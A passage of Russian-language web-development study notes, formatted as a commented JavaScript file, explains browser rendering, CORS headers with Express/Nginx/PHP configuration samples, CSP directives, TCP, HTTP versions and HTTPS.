			// ✅ ⁡⁢⁢⁢Обработка CSS⁡
			// 🔹 ⁡⁣⁢⁢ПОСТРОЕНИЕ CSSOM (CSS OBJECT MODEL) ИЗ СТИЛЕЙ:⁡
			// 🔸 ⁡⁢⁣⁣Анализ встроенных стилей, внешних CSS-файлов.⁡
			// 🔸 ⁡⁢⁣⁣Определение каскада и специфичности стилей.⁡
			// ✅ ⁡⁢⁢⁢Создание Render Три(Tree)⁡
			// 🔹 ⁡⁣⁢⁢DOM И CSSOM ОБЪЕДИНЯЮТСЯ В RENDER TREE:⁡
			// 🔸 ⁡⁢⁣⁣Только видимые элементы (исключаются display: none, скрытые теги).⁡
			// 🔸 ⁡⁢⁣⁣Определяются стили для каждого элемента.⁡
			// ✅ ⁡⁢⁢⁢Layout (Reflow)⁡
			// 🔹 ⁡⁣⁢⁢РАССЧЁТ ПОЗИЦИЙ И РАЗМЕРОВ ЭЛЕМЕНТОВ:⁡
			// 🔸 ⁡⁢⁣⁣Определяются координаты (x, y), ширина, высота.⁡
			// 🔸 ⁡⁢⁣⁣Влияет на производительность: изменения DOM/CSSOM вызывают повторный Layout.⁡
			// 🔹 ⁡⁣⁢⁢ПРИ ИЗМЕНЕНИИ СВОЙСТ ВЫЗЫВАЮТ Reflow⁡
			{
				// ⚪ ⁡⁣⁣⁢width, height, margin, padding, border, top, right, bottom, left (если не используется transform), font-size, line-height (меняют размер текста и влияют на соседние элементы), display (переключение между block, inline и т. д.)⁡
			}
			// ✅ ⁡⁢⁢⁢Painting (Растеризация)⁡
			// 🔹 ⁡⁣⁢⁢ОТРИСОВКА ПИКСЕЛЕЙ:⁡⁡
			// 🔸 ⁡⁢⁣⁣Преобразование Render Tree в пиксели (работа с графическим процессором).⁡
			// 🔸 ⁡⁢⁣⁣Этапы: заливка фона, границы, текст, изображения.⁡
			// ✅ ⁡⁢⁢⁢Композиция (Composite)⁡
			// 🔹 ⁡⁣⁢⁢СЛОИ (НАПРИМЕР, АНИМИРОВАННЫЕ ЭЛЕМЕНТЫ) ОБЪЕДИНЯЮТСЯ В ОКОНЧАТЕЛЬНОЕ ИЗОБРАЖЕНИЕ.⁡
			// 🔹 ⁡⁣⁢⁢ОПТИМИЗАЦИЯ ДЛЯ ПЛАВНОГО СКРОЛЛА И АНИМАЦИЙ.⁡
			// 🔹 ⁡⁣⁢⁢ПРИ ИЗМЕНЕНИИ СВОЙСТ ВЫЗЫВАЮТ paint⁡
			{
				// ⚪ ⁡⁣⁣⁢color, background-color, box-shadow, text-shadow, background-image (изменение градиентов или изображений), opacity (если не используется вместе с will-change или transform)⁡
			}
		}
		// ⁡⁢⁣⁡⁢⁣⁣9. ЗАГРУЗКА ДОПОЛНИТЕЛЬНЫХ РЕСУРСОВ⁡
		{
			// 🔳 ⁡⁣⁣⁢После начального рендеринга браузер загружает:⁡
			// ✅ ⁡⁢⁢⁢Изображения, видео, шрифты.⁡
			// ✅ ⁡⁢⁢⁢Внешние скрипты и стили.⁡
			// 🔳 ⁡⁣⁣⁢События:⁡
			// ✅ ⁡⁢⁢⁢DOMContentLoaded — DOM готов (без ожидания изображений).⁡
			// ✅ ⁡⁢⁢⁢load — все ресурсы загружены.⁡
		}
		// ⁡⁢⁣⁣10. ОПТИМИЗАЦИИ И КЭШИРОВАНИЕ⁡
		{
			// 🔳 ⁡⁣⁣⁢Браузер кэширует ресурсы для ускорения последующих загрузок.⁡
			// 🔳 ⁡⁣⁣⁢Используются:⁡
			// ✅ ⁡⁢⁢⁢HTTP-кэш (заголовки Cache-Control, ETag).⁡
			// ✅ ⁡⁢⁢⁢Service Workers (для офлайн-работы).⁡
			// ✅ ⁡⁢⁢⁢Prefetch/Preload — предзагрузка ресурсов.⁡
		}
		// ⁡⁢⁣⁣ДОПОЛНИТЕЛЬНЫЕ АСПЕКТЫ:⁡
		{
			// 🔳 ⁡⁣⁣⁢Редиректы: Если сервер возвращает 301 или 302, браузер повторяет процесс для нового URL.⁡
			// 🔳 ⁡⁣⁣⁢CDN: Контент может загружаться с ближайшего CDN-сервера для ускорения.⁡
			// 🔳 ⁡⁣⁣⁢HTTP/2 и HTTP/3: Ускоряют загрузку через мультиплексирование и QUIC-протокол.⁡
			// 🔳 ⁡⁣⁣⁢Блокирующие ресурсы: Скрипты без async/defer могут замедлять рендеринг.⁡
		}
	}
}
// ⁡⁢⁣⁢CORS (CROSS-ORIGIN RESOURCE SHARING) СОВМЕСТНОЕ ИСПОЛЬЗОВАНИЕ РЕСУРСОВ ИЗ РАЗНЫХ ИСТОЧНИКОВ⁡
{
	// 🔳 ⁡⁣⁣⁡⁢⁣⁣ПРЕДЫСТОРИЯ: ПОЧЕМУ ПОЯВИЛСЯ CORS?⁡
	{
		// 🔹 ⁡⁣⁣⁢До CORS браузеры использовали Same-Origin Policy (SOP, политика одинакового источника) — механизм безопасности, который запрещал скриптам на одной странице запрашивать ресурсы с другого домена. Это предотвращало атаки, такие как XSS (межсайтовый скриптинг). Однако это ограничивало легитимные сценарии, когда ресурсы должны были быть доступны из разных источников (например, API)⁡
	}
	// 🔳 ⁡⁢⁣⁣КАК РАБОТАЕТ CORS?⁡
	{
		// ✅ ⁡⁢⁢⁢Основные понятия⁡
		// 🔹 ⁡⁣⁣⁢Простой (Simple) запрос — GET/POST/HEAD с разрешёнными заголовками (например, Content-Type: text/plain)⁡
		// 🔹 ⁡⁣⁢⁡⁣⁣⁢Предварительный (Preflight) запрос — OPTIONS-запрос перед основным, если он сложный (например, с кастомными заголовками)⁡
		// ✅ ⁡⁢⁢⁢Механизм CORS⁡
		// 🔹 ⁡⁣⁣⁢Браузер отправляет запрос на другой домен⁡
		// 🔹 ⁡⁣⁣⁢Сервер отвечает с заголовками CORS, например⁡
		{
			// Access-Control-Allow-Origin: https://your-site.com
			// Access-Control-Allow-Methods: GET, POST, PUT
			// Access-Control-Allow-Headers: Content-Type, Authorization
		}
		// 🔹 ⁡⁣⁣⁢Браузер проверяет заголовки и разрешает/блокирует ответ⁡
	}
	// 🔳 ⁡⁢⁣⁣ТИПЫ ЗАПРОСОВ CORS⁡
	{
		// ✅ ⁡⁢⁢⁢Простой запрос (Simple Request)⁡
		// 🔹 ⁡⁣⁣⁢Методы: GET, POST, HEAD⁡
		// 🔹 ⁡⁣⁣⁢Заголовки: только стандартные (Accept, Content-Type: text/plain, multipart/form-data и др.)⁡
		// ✅ ⁡⁢⁢⁢Предварительный запрос (Preflight Request) возникает⁡
		// 🔹 ⁡⁣⁣⁢При использовании нестандартных методов (PUT, DELETE, PATCH) или заголовков (например, Authorization)⁡
		// 🔹 ⁡⁣⁣⁢Кастомные заголовки (Authorization, X-API-Key)⁡
		// 🔹 ⁡⁣⁣⁢Браузер сначала отправляет OPTIONS-запрос на сервер, чтобы узнать, разрешены ли такие запросы⁡
		// 🔹 ⁡⁣⁣⁢Сервер отвечает с заголовками CORS, например⁡
		{
			// Access-Control-Allow-Origin: https://your-site.com⁡
			// Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS⁡
			// ⁡⁢⁣Access-Control-Allow-Headers: Content-Type, Authorization, X-API-Key⁡
		}
		// 🔹 ⁡⁣⁣⁢Если сервер разрешает запрос, браузер отправляет основной запрос (GET, POST и т.д.)⁡
	}
	// 🔳 ⁡⁢⁣⁣ВАЖНЫЕ CORS-ЗАГОЛОВКИ⁡
	{
		// ✅ ⁡⁢⁢⁢Серверные заголовки (ответ)⁡
		// ⁡⁣⁣⁡⁣⁣⁢ЗАГОЛОВОК										   ОПИСАНИЕ⁡
		// ⁡⁢⁣⁣Access-Control-Allow-Origin						Разрешает домены (* или конкретный https://site.com).⁡
		// ⁡⁢⁣⁣Access-Control-Allow-Methods						Разрешённые методы (GET, POST, PUT).⁡
		// ⁡⁢⁣⁣Access-Control-Allow-Headers						Разрешённые заголовки (Content-Type, Authorization).⁡
		// ⁡⁢⁣⁣Access-Control-Allow-Credentials					Разрешает отправку кук (true/false).⁡
		// ⁡⁢⁣⁣Access-Control-Max-Age							Кэширование Preflight (в секундах, например, 86400 — 1 день)⁡
		// ✅ ⁡⁢⁢⁢Клиентские заголовки (запрос)⁡
		// ⁡⁣⁣⁢ЗАГОЛОВОК										ОПИСАНИЕ⁡
		// ⁡⁢⁣⁣Origin											Указывает источник запроса (автоматически добавляется браузером).⁡
		// ⁡⁢⁣⁣Access-Control-Request-Method					Используется в Preflight (указывает метод основного запроса).⁡
		// ⁡⁢⁣⁣Access-Control-Request-Headers					Используется в Preflight (указывает заголовки основного запроса)⁡
	}
	// 🔳 ⁡⁢⁣⁣ПРИМЕРЫ НАСТРОЙКИ CORS⁡
	{
		// 🔹 ⁡⁣⁣⁢Node.js (Express)⁡
		{
			const express = require("express");
			const app = express();
			// Разрешить запросы с любого домена (небезопасно!)
			app.use((req, res, next) => {
				res.header("Access-Control-Allow-Origin", "*");
				res.header("Access-Control-Allow-Methods", "GET, POST, PUT");
				res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
				next();
			});
			// Для запросов с куками
			app.use((req, res, next) => {
				res.header("Access-Control-Allow-Origin", "https://your-site.com");
				res.header("Access-Control-Allow-Credentials", "true");
				next();
			});
			app.get("/data", (req, res) => {
				res.json({ message: "Данные доступны!" });
			});
			app.listen(3000);
		}
		// 🔹 ⁡⁣⁣⁢Nginx⁡
		{
			server;
			{
				location /
					{
						// add_header 'Access-Control-Allow-Origin' 'https://your-site.com';
						// add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS';
						// add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization';
						// # Для Preflight
						if($request_method = "OPTIONS") {
							// add_header 'Access-Control-Max-Age' 86400;
							return 204;
						},
					};
			}
		}
		// 🔹 ⁡⁣⁣⁢PHP (Apache)⁡
		{
			// <?php
			// header("Access-Control-Allow-Origin: https://your-site.com");
			// header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
			// header("Access-Control-Allow-Headers: Content-Type, Authorization");
			// if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
			// 	header("Access-Control-Max-Age: 86400"); // Кэширование Preflight
			// 	exit(0);
			// }
			// ?>
			// echo json_encode(["message" => "Данные доступны!"]);
		}
	}
	// 🔳 ⁡⁢⁣⁣ИТОГ⁡
	{
		// ✅ ⁡⁢⁢⁢CORS нужен для безопасных кросс-доменных запросов.⁡
		// ✅ ⁡⁢⁢⁢Простой запрос: GET/POST с простыми заголовками.⁡
		// ✅ ⁡⁢⁢⁢Preflight запрос: OPTIONS для сложных запросов (PUT, DELETE, кастомные заголовки).⁡
		// ✅ ⁡⁢⁢⁢Сервер должен явно разрешать домены, методы и заголовки.⁡
		// ✅ ⁡⁢⁢⁢credentials: true требует Access-Control-Allow-Credentials: true и конкретного Origin.⁡
	}
	
}
//! ⁡⁢⁣⁢CSP (CONTENT SECURITY POLICY)⁡
{
	// ⭐ ⁡⁣⁣⁢CSP (Content Security Policy) - это стандарт безопасности, который помогает предотвращать различные виды атак, такие как XSS (межсайтовый скриптинг), инъекции данных и другие уязвимости.⁡
	{
		// 🔳 ⁡⁢⁣⁣ДЛЯ ЧЕГО НУЖЕН CSP?⁡
		{
			// 🔹 ⁡⁣⁢⁢CSP позволяет владельцам сайтов:⁡
			{
				// ⚪ ⁡⁣⁣⁢Контролировать, какие ресурсы (скрипты, стили, изображения и т.д.) могут загружаться на странице⁡
				// ⚪ ⁡⁣⁣⁢Предотвращать выполнение вредоносного кода⁡
				// ⚪ ⁡⁣⁣⁢Ограничивать источники загружаемого контента⁡
				// ⚪ ⁡⁣⁣⁡⁣⁣⁢Защищать от атак типа "man-in-the-middle" -  это тип кибератаки, при которой злоумышленник «пропускает» веб-трафик жертвы «через себя»⁡
				// ⚪ ⁡⁣⁣⁢Отчитываться о нарушениях политики безопасности⁡
			}
		}
		// 🔳 ⁡⁢⁣⁣КАК РАБОТАЕТ CSP?⁡
		{
			// ⚪ ⁡⁣⁣⁢Сержатель сайта определяет политику безопасности в HTTP-заголовке или мета-теге⁡
			// ⚪ ⁡⁣⁣⁢Браузер получает эту политику и применяет её при загрузке страницы⁡
			// ⚪ ⁡⁣⁣⁢При попытке загрузить ресурс, не соответствующий политике, браузер блокирует его⁡
			// ⚪ ⁡⁣⁣⁢Можно настроить отправку отчётов о нарушениях на сервер⁡
		}
		// 🔳 ⁡⁢⁣⁣ПРИМЕРЫ CSP:⁡
		{
			// ⭐ ⁡⁣⁣⁢Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com⁡
			// ⭐ ⁡⁣⁣⁢<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">⁡
		}
		// 🔳 ⁡⁢⁣⁣ОСНОВНЫЕ ДИРЕКТИВЫ CSP:⁡
		{
			// ⭐ ⁡⁣⁣⁢default-src - политика по умолчанию для всех типов ресурсов⁡
			// ⭐ ⁡⁣⁣⁢script-src - определяет допустимые источники JavaScript⁡
			// ⭐ ⁡⁣⁣⁢style-src - источники CSS-стилей⁡
			// ⭐ ⁡⁣⁣⁢img-src - источники изображений⁡
			// ⭐ ⁡⁣⁣⁢connect-src - ограничения для XHR, WebSockets⁡
			// ⭐ ⁡⁣⁣⁢frame-src - источники для фреймов⁡
			// ⭐ ⁡⁣⁣⁢report-uri - URL для отправки отчётов о нарушениях⁡
		}
		// 🔳
	}
}
// ⁡⁢⁣⁢ВИДЫ СОЕДИНЕНИЙ И ПРОТОКОЛОВ ПО TCP⁡
{
	// 🔳 ⁡⁣⁣⁡⁢⁣⁣TCP (Transmission Control Protocol) — это протокол управления передачей, который обеспечивает надёжный обмен данными в компьютерных сетях. Он позволяет передавать информацию между устройствами и серверами с максимальной точностью и минимальными потерями.⁡
	{
		// 🔹 ⁡⁣⁢⁢ЧТО ТАКОЕ TCP?⁡
		{
			// ✅ ⁡⁢⁢⁢TCP (Transmission Control Protocol) — это протокол транспортного уровня стека TCP/IP, обеспечивающий надёжную, упорядоченную и проверенную передачу данных между устройствами в сетях (например, интернете).Основные задачи TCP:⁡
			// ⚪ ⁡⁣⁣⁢Установка соединения между отправителем и получателем.⁡
			// ⚪ ⁡⁣⁣⁢Гарантия доставки данных без ошибок.⁡
			// ⚪ ⁡⁣⁣⁢Управление потоком и перегрузками.⁡
			// ✅ ⁡⁢⁢⁢Ключевые особенности:⁡
			// ⚪ ⁡⁣⁣⁢Надёжность: данные не теряются и не дублируются.⁡
			// ⚪ ⁡⁣⁣⁢Упорядоченность: пакеты приходят в том порядке, в котором были отправлены.⁡
			// ⚪ ⁡⁣⁣⁢Соединение-ориентированность: перед передачей устанавливается логическое соединение.⁡
			// ⚪ ⁡⁣⁣⁢Полнодуплексный режим: одновременная передача данных в обе стороны.⁡
		}
		// 🔹 ⁡⁣⁢⁢ИСТОРИЯ TCP⁡
		{
			// ✅ ⁡⁢⁢⁢1974 — Винт Серф и Боб Кан опубликовали статью с концепцией протокола для объединения сетей (предшественник TCP/IP).⁡
			// ✅ ⁡⁢⁢⁢1981 — RFC 793: официальная спецификация TCP (версия 4, используемая до сих пор).⁡
			// ✅ ⁡⁢⁢⁢1983 — ARPANET перешла на TCP/IP, что стало основой современного интернета.⁡
			// ✅ ⁡⁢⁢⁢1990-е — Развитие механизмов управления перегрузками (Tahoe, Reno, NewReno).⁡
			// ✅ ⁡⁢⁢⁢2000-е — Оптимизации для высокоскоростных сетей (TCP BBR, FAST TCP).⁡
		}
		// 🔹 ⁡⁣⁢⁢Принцип работы TCP⁡
		{
			// ✅ ⁡⁢⁢⁢Установка соединения (Three-Way Handshake)⁡
			// ✅ ⁡⁢⁢⁢Перед передачей данных клиент и сервер выполняют «рукопожатие»:⁡
			// ⚪ ⁡⁣⁣⁢SYN: Клиент отправляет пакет с флагом SYN (synchronize) и случайным номером последовательности (Seq=X).⁡
			// ⚪ ⁡⁣⁣⁢SYN-ACK: Сервер отвечает пакетом SYN-ACK (подтверждение) со своим номером (Seq=Y) и ACK=X+1.⁡
			// ⚪ ⁡⁣⁣⁢ACK: Клиент подтверждает соединение пакетом ACK=Y+1.Теперь канал готов к передаче данных.⁡
			// ✅ ⁡⁢⁢⁢Передача данных⁡
			// ⚪ ⁡⁣⁣⁢Сегментация: Данные разбиваются на сегменты с уникальными номерами (Seq).⁡
			// ⚪ ⁡⁣⁣⁢Подтверждение (ACK): Получатель отправляет ACK с номером следующего ожидаемого сегмента.⁡
			// ⚪ ⁡⁣⁣⁢Повторная передача: Если ACK не пришёл за определённое время (таймаут), сегмент отправляется заново.⁡
			// ⚪ ⁡⁣⁣⁢Управление потоком: Механизм окна (Window Size) регулирует скорость передачи, чтобы не перегрузить получателя.⁡
			// ⚪ ⁡⁣⁣⁢Управление перегрузками: Алгоритмы (например, Slow Start, Congestion Avoidance) адаптируют скорость передачи под загруженность сети.⁡
			// ✅ ⁡⁢⁢⁢Завершение соединения (Four-Way Handshake)⁡
			// ⚪ ⁡⁣⁣⁢Одна из сторон отправляет FIN (запрос на завершение).⁡
			// ⚪ ⁡⁣⁣⁢Вторая сторона подтверждает FIN пакетом ACK.⁡
			// ⚪ ⁡⁣⁣⁢Когда вторая сторона готова, она отправляет свой FIN.⁡
			// ⚪ ⁡⁣⁣⁢Первая сторона подтверждает его ACK. Соединение закрыто.⁡
		}
		// 🔹 ⁡⁣⁢⁢ОСНОВНЫЕ МЕХАНИЗМЫ TCP⁡
		{
			// ⁡⁣⁣⁢МЕХАНИЗМ				ОПИСАНИЕ⁡
			// ⁡⁢⁣⁣Чексумма				Проверка целостности данных (обнаружение ошибок).⁡
			// ⁡⁢⁣⁣Таймауты				Повторная отправка данных, если подтверждение (ACK) не пришло вовремя.⁡
			// ⁡⁢⁣⁣Селективные ACK		Подтверждение отдельных сегментов (SACK) для оптимизации повторных передач.⁡
			// ⁡⁢⁣⁣Nagle Algorithm		Снижение накладных расходов за счёт объединения мелких пакетов.⁡
		}
		// 🔹 ⁡⁣⁢⁢ГДЕ ИСПОЛЬЗУЕТСЯ TCP?⁡
		{
			// ✅ ⁡⁢⁢⁢Веб-сёрфинг (HTTP/HTTPS).⁡
			// ✅ ⁡⁢⁢⁢Электронная почта (SMTP, IMAP, POP3).⁡
			// ✅ ⁡⁢⁢⁢Передача файлов (FTP, SFTP).⁡
			// ✅ ⁡⁢⁢⁢Удалённый доступ (SSH, Telnet).⁡
			// ✅ ⁡⁢⁢⁢Стриминг (хотя часто используется UDP, TCP применяется для VoD, например, YouTube).⁡
		}
		// 🔹 ⁡⁣⁢⁢TCP против UDP⁡
		{
			// ⁡⁣⁣⁢ПАРАМЕТР			TCP								UDP⁡
			// ⁡⁢⁣⁣Надёжность		Гарантирует доставку			Нет гарантий⁡
			// ⁡⁢⁣⁣Скорость			Медленнее (из-за проверок)		Быстрее⁡
			// ⁡⁢⁣⁣Соединение		Требует установки				Без соединения⁡
			// ⁡⁢⁣⁣Использование	Веб-страницы, файлы, почта		Видеозвонки, онлайн-игры, DNS⁡
		}
		// 🔹 ⁡⁣⁢⁢ПРОБЛЕМЫ TCP⁡
		{
			// ✅ ⁡⁢⁢⁢Задержки: Из-за трёхэтапного рукопожатия и проверок.⁡
			// ✅ ⁡⁢⁢⁢Неэффективность в lossy-сетях: Высокие потери пакетов (например, Wi-Fi) приводят к частым повторным передачам.⁡
			// ✅ ⁡⁢⁢⁢Уязвимости: SYN-flood-атаки (перегрузка сервера запросами на соединение).⁡
		}
		// 🔹 ⁡⁣⁢⁢РАЗВИТИЕ TCP⁡
		{
			// ✅ ⁡⁢⁢⁢Современные оптимизации:⁡
			// ⚪ ⁡⁣⁣⁢TCP Fast Open (TFO): Уменьшает задержки при повторных соединениях.⁡
			// ⚪ ⁡⁣⁣⁢Multipath TCP: Использование нескольких сетевых путей для повышения надёжности.⁡
			// ⚪ ⁡⁣⁣⁢QUIC: Новый протокол поверх UDP, устраняющий недостатки TCP (используется в HTTP/3).⁡
		}
		// 🔹 ⁡⁣⁢⁢ВЫВОД⁡
		{
			// ✅ ⁡⁢⁢⁢TCP — фундаментальный протокол интернета, обеспечивающий надёжную передачу данных. Несмотря на конкуренцию с UDP и QUIC, он остаётся незаменимым для критически важных задач, где важна точность, а не скорость. Понимание TCP необходимо для работы с сетевыми технологиями, оптимизации серверов и устранения неполадок.⁡ 🌐🔧
		}
	}
	// 🔳 ⁡⁣⁣⁡⁢⁣⁣HTTP (HyperText Transfer Protocol) — это протокол прикладного уровня для передачи гипертекстовых документов (например, HTML). Он лежит в основе обмена данными в интернете и работает по схеме «клиент-сервер»⁡
	{
		// 🔹 ⁡⁣⁢⁢ЧТО ТАКОЕ HTTP?⁡
		{
			// ✅ ⁡⁢⁢⁢HTTP (HyperText Transfer Protocol) — это протокол прикладного уровня для передачи гипертекстовых документов (например, HTML). Он лежит в основе обмена данными в интернете и работает по схеме «клиент-сервер»⁡
			// ⚪ ⁡⁣⁣⁢Клиент (браузер) отправляет запрос.⁡
			// ⚪ ⁡⁣⁣⁢Сервер (веб-сайт) обрабатывает его и возвращает ответ.⁡
			// ✅ ⁡⁢⁢⁢Основные характеристики HTTP:⁡
			// ⚪ ⁡⁣⁣⁢Не сохраняет состояние (stateless) — каждый запрос обрабатывается независимо.⁡
			// ⚪ ⁡⁣⁣⁢Работает поверх TCP/IP (обычно порт 80).⁡
			// ⚪ ⁡⁣⁣⁢Использует текстовые команды (GET, POST, PUT, DELETE и др.).⁡
			// ⚪ ⁡⁣⁣⁢Не защищает данные — информация передаётся в открытом виде.⁡
		}
		// 🔹 ⁡⁣⁢⁢ИСТОРИЯ HTTP(HTTP/2, HTTP/3)⁡
		{
			// ✅ ⁡⁢⁢⁢1991 — Тим Бернерс-Ли создал HTTP/0.9 (очень простой, только GET-запросы).⁡
			// ✅ ⁡⁢⁢⁢1996 — HTTP/1.0 (добавлены методы POST, HEAD, заголовки, коды статусов).⁡
			// ✅ ⁡⁢⁢⁢1997 — HTTP/1.1 (поддержка постоянных соединений, кэширования, виртуальных хостов).⁡
			{
				// ⚪ ⁡⁣⁣⁢Назначение: Основа современного веба. Передача гипертекстовых документов (HTML), изображений, стилей, скриптов и других ресурсов между клиентом (браузером) и сервером.⁡
				// ⚪ ⁡⁣⁣⁢Характеристики:⁡
				{
					// ⚡ ⁡⁢⁣⁣Работает поверх TCP: Использует надежную доставку пакетов.⁡
					// ⚡ ⁡⁢⁣⁣Статус без состояния (Stateless): Каждый запрос обрабатывается сервером независимо. Для отслеживания состояния (логины, корзины) используются механизмы вроде Cookies, сессий.⁡
					// ⚡ ⁡⁢⁣⁣Модель "Запрос-Ответ": Клиент отправляет запрос (с методом: GET, POST, PUT, DELETE и т.д.), сервер возвращает ответ (с кодом статуса: 200 OK, 404 Not Found, 500 Error и т.д.).⁡
					// ⚡ ⁡⁢⁣⁣Порты: По умолчанию 80.⁡
				}
				// ⚪ ⁡⁣⁣⁢Где применяется: Загрузка подавляющего большинства веб-страниц (особенно без конфиденциальных данных), API, RESTful-сервисы.⁡
			}
			// ✅ ⁡⁢⁢⁢2015 — HTTP/2 (бинарный протокол, мультиплексирование, сжатие заголовков).⁡
			{
				// ⚪ ⁡⁣⁣⁢Назначение: Эволюционное обновление HTTP/1.1 для повышения производительности.⁡
				// ⚪ ⁡⁣⁣⁢Характеристики:⁡
				{
					// ⚡ ⁡⁢⁣⁣Бинарный протокол: В отличие от текстового HTTP/1.1, что упрощает и ускоряет парсинг.⁡
					// ⚡ ⁡⁢⁣⁣Мультиплексирование: Позволяет передавать множество запросов и ответов параллельно в рамках одного TCP-соединения, устраняя проблему блокировки "головы очереди" (Head-of-Line Blocking) HTTP/1.1.⁡
					// ⚡ ⁡⁢⁣⁣Приоритизация запросов: Клиент может указать серверу, какие ресурсы важнее и должны быть отправлены первыми.⁡
					// ⚡ ⁡⁢⁣⁣Сжатие заголовков (HPACK): Уменьшает избыточность в HTTP-заголовках, экономя трафик.⁡
					// ⚡ ⁡⁢⁣⁣Server Push: Сервер может предварительно отправить ресурсы (CSS, JS, изображения), которые, по его прогнозу, понадобятся клиенту для отображения страницы, до того как клиент их запросит.⁡
					// ⚡ ⁡⁢⁣⁣Работает поверх TCP: Как и HTTP/1.1.⁡
					// ⚡ ⁡⁢⁣⁣Обязательно с TLS: В браузерах HTTP/2 поддерживается только поверх HTTPS (за редкими исключениями в локальных сетях).⁡
				}
				// ⚪ ⁡⁣⁣⁢Где применяется: Ускорение загрузки современных сложных веб-сайтов и веб-приложений. Требует поддержки как сервером, так и браузером (поддержка есть во всех современных браузерах).⁡
			}
			// ✅ ⁡⁢⁢⁢2022 — HTTP/3 (работает поверх QUIC вместо TCP, уменьшает задержки).⁡
			{
				// ⚪ ⁡⁣⁣⁢Назначение: Следующий шаг в эволюции HTTP, призванный решить фундаментальные проблемы производительности TCP, особенно в условиях нестабильных сетей (мобильный интернет).⁡
				// ⚪ ⁡⁣⁣⁢Характеристики:⁡
				{
					// ⚡ ⁡⁢⁣⁣Работает поверх QUIC: Ключевое отличие! QUIC — это новый транспортный протокол от Google, работающий поверх UDP.⁡
					// ⚡ ⁡⁢⁣⁣Встроенное шифрование: Шифрование (часть TLS 1.3) интегрировано непосредственно в QUIC, ускоряя установление соединения (0-RTT в некоторых случаях).⁡
					// ⚡ ⁡⁢⁣⁣Устранение HOL Blocking на транспортном уровне: Потеря пакета в одном потоке данных (stream) не блокирует доставку пакетов в других потоках того же соединения. Это главное преимущество перед HTTP/2/TCP.⁡
					// ⚡ ⁡⁢⁣⁣Быстрое восстановление соединения: При смене сети (WiFi -> мобильный интернет) QUIC восстанавливает соединение быстрее, чем TCP (не требует полного нового рукопожатия).⁡
					// ⚡ ⁡⁢⁣⁣Наследует преимущества HTTP/2: Мультиплексирование, приоритизация, сжатие заголовков (QPACK), Server Push (хотя его использование пересматривается).⁡
				}
				// ⚪ ⁡⁣⁣⁢Где применяется: Там, где критична скорость и стабильность соединения: стриминг видео/аудио, онлайн-игры, большие веб-приложения, мобильный интернет. Поддержка быстро растет в браузерах (Chrome, Firefox, Edge, Safari) и серверах (Cloudflare, Google, Nginx, Apache).⁡
			}
		}
		// 🔹 ⁡⁣⁢⁢ЧТО ТАКОЕ HTTPS?⁡
		{
			// ✅ ⁡⁢⁢⁢HTTPS (HyperText Transfer Protocol Secure) — это защищённая версия HTTP, которая шифрует данные с помощью SSL/TLS.⁡
			// ✅ ⁡⁢⁢⁢Основные отличия от HTTP:⁡
			// ⚪ ⁡⁣⁣⁢Шифрование (данные нельзя перехватить).⁡
			// ⚪ ⁡⁣⁣⁢Аутентификация (сервер подтверждает свою подлинность).⁡
			// ⚪ ⁡⁣⁣⁢Целостность данных (информация не может быть изменена злоумышленником).⁡
			// ⚪ ⁡⁣⁣⁢Порт 443 (вместо 80 у HTTP).⁡
		}
		// 🔹 ⁡⁣⁢⁢КАК РАБОТАЕТ HTTPS?⁡
		{
			// ✅ ⁡⁢⁢⁢HTTPS использует криптографические протоколы SSL/TLS для безопасного соединения.⁡
			// ✅ ⁡⁢⁢⁢Этапы установки HTTPS-соединения (Handshake):⁡
			// ⚪ ⁡⁣⁣⁢Клиент отправляет запрос на сервер с поддержкой HTTPS.⁡
			// ⚪ ⁡⁣⁣⁢Сервер отправляет SSL-сертификат (содержит публичный ключ).⁡
			// ⚪ ⁡⁣⁣⁢Клиент проверяет сертификат (например, через центры сертификации, вроде Let's Encrypt).⁡
			// ⚪ ⁡⁣⁣⁢Генерируется сеансовый ключ (симметричное шифрование для быстрой передачи данных).⁡
			// ⚪ ⁡⁣⁣⁢Начинается безопасный обмен данными (все сообщения шифруются).⁡
			// ✅ ⁡⁢⁢⁢Типы шифрования в HTTPS:⁡
			// ⚪ ⁡⁣⁣⁢Асимметричное (RSA, ECC) — для проверки сертификата.⁡
			// ⚪ ⁡⁣⁣⁢Симметричное (AES, ChaCha20) — для передачи данных.⁡
		}
		// 🔹 ⁡⁣⁢⁢ЗАЧЕМ НУЖЕН HTTPS?⁡
		{
			// ✅ ⁡⁢⁢⁢Защита от перехвата (MitM-атаки, сниффинг).⁡
			// ✅ ⁡⁢⁢⁢Доверие пользователей (браузеры показывают 🔒).⁡
			// ✅ ⁡⁢⁢⁢SEO-преимущество (Google ранжирует HTTPS выше).⁡
			// ✅ ⁡⁢⁢⁢Соответствие стандартам (GDPR, PCI DSS).⁡
		}
		// 🔹 ⁡⁣⁢⁢КАК ПЕРЕЙТИ С HTTP НА HTTPS?⁡
		{
			// ✅ ⁡⁢⁢⁢Купить SSL-сертификат (или получить бесплатный от Let's Encrypt).⁡
			// ✅ ⁡⁢⁢⁢Установить его на сервер (через панель хостинга или вручную).⁡
			// ✅ ⁡⁢⁢⁢Настроить редирект с HTTP на HTTPS (через .htaccess или Nginx).⁡
			// ✅ ⁡⁢⁢⁢Проверить работу (инструменты вроде SSL Labs).⁡
		}
		// 🔹 ⁡⁣⁢⁢ВЫВОД⁡
		{
			// ✅ ⁡⁢⁢⁢HTTP — быстрый, но небезопасный.⁡
			// ✅ ⁡⁢⁢⁢HTTPS — защищённый стандарт современного интернета. С 2018 года Google Chrome помечает HTTP-сайты как «Небезопасные», поэтому переход на HTTPS обязателен для всех веб-ресурсов.⁡
		}
	}
	// 🔳 ⁡⁢⁣⁣REST (Representational State Transfer) — это архитектурный стиль для создания масштабируемых веб-сервисов. Разработан Роем Филдингом в 2000 году как стандарт взаимодействия между клиентом и сервером через HTTP.⁡
	{
		// ⁡⁣⁢⁢✅ ⁡⁢⁢⁢ОСНОВНЫЕ ПРИНЦИПЫ REST⁡
		{
			// 🔹 ⁡⁣⁣⁢Клиент-Серверная архитектура: Чёткое разделение ответственности: клиент управляет UI, сервер — данными и бизнес-логикой⁡
